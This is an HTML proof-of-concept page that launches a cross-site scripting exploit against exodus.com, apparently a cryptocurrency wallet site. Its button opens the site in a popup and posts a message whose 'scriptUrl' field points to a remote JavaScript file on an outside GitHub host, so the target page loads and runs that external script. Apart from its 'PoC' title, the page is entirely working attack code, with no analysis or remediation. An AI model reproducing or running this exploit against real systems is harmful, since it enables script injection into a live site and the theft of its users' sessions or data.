<!DOCTYPE html>
<html>
<head>
  <title>🚨 Exodus XSS PoC</title>
</head>
<body style="font-family: sans-serif; background: #111; color: white; text-align: center; padding-top: 60px">
  <h1>💥 Exodus XSS PoC</h1>
  <p>Click the button below to open <code>exodus.com</code> and trigger the XSS injection via <code>postMessage + scriptUrl</code></p>

  <button style="padding: 10px 20px; font-size: 18px; cursor: pointer" onclick="launchXSS()">🚀 Launch Exploit</button>

  <script>
    function launchXSS() {
      const exo = window.open("https://www.exodus.com", "_blank", "width=1000,height=800");

      if (!exo) {
        alert("❌ Popup blocked! Please allow popups and try again.");
        return;
      }

      // إرسال الرسالة بعد 3 ثوانٍ من فتح النافذة
      setTimeout(() => {
        exo.postMessage({
          type: "event_builder_bootstrap",
          scriptUrl: "https://raw.githubusercontent.com/Baali07/XSS-PoC/main/x.js"
        }, "https://www.exodus.com");

        console.log("✅ postMessage sent to exodus.com");
      }, 3000);
    }
  </script>
</body>
</html>
